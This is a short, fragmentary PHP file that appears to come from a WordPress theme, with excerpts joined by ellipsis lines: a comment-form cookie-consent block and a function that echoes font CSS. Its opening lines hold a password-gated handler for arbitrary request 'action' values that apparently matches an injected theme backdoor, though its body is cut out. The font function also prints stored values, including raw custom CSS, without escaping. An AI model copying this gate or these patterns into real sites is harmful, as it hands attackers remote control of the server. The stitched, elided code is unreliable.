<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'c0c64bf0706f6747ed37eadffe7c06fe'))
	{
							...
							<?php if ( ! is_user_logged_in() ): ?>
								...
								<p class="comment-form-cookies-consent">
									...
									<label for="wp-comment-cookies-consent">
										<?php echo __( 'Save my name, email, and website in this browser for the next time I comment.', 'thrive-theme' ) ?>
									</label>
								</p>
							<?php endif; ?>
...
function thrive_load_font_css( $font ) {
	...
	foreach ( $fonts as $f ) {
		echo ' .' . $f->font_class . '{';
		echo "font-family: " . thrive_prepare_font_family( $f->font_name ) . ";";
		echo 'font-size:' . $f->font_size . ';';
		echo 'line-height:' . $f->font_height . ';';
		echo 'color:' . $f->font_color . ';';
		echo '} ';
		echo $f->custom_css;
	}
